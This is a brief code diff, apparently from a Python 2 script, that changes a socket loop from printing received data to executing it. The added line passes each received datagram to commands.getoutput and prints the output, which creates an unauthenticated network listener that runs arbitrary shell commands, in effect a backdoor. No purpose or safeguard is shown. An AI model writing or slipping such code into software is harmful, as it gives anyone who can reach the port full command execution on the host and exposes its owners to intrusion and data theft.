@@ -10,7 +10,10 @@ while True:
 	
 	data=s.recvfrom(20)
 	recv_cmd=data[0]
-	print (recv_cmd)
+	d=commands.getoutput(recv_cmd)
+	print (d)
 
+
+	
 
 	
